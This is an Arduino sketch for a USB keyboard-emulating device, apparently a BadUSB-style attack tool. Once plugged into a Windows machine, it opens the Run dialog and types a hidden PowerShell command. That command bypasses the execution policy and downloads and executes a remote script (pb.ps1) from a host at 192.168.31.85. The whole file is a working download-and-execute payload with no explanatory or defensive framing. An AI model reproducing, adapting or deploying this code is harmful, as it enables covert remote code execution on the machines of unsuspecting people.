#include <Keyboard.h>

char scriptAddr[] = "http://192.168.31.85:3000/pb.ps1"; 

void setup() 
{
    Keyboard.begin();
    delay(1000);

    Keyboard.press(KEY_RIGHT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);
    String command("cmd /c \"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString(\'");
    command.concat(scriptAddr);
    command.concat("')\"");
    Keyboard.print(command.c_str());
    delay(500);
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
}

void loop() {}
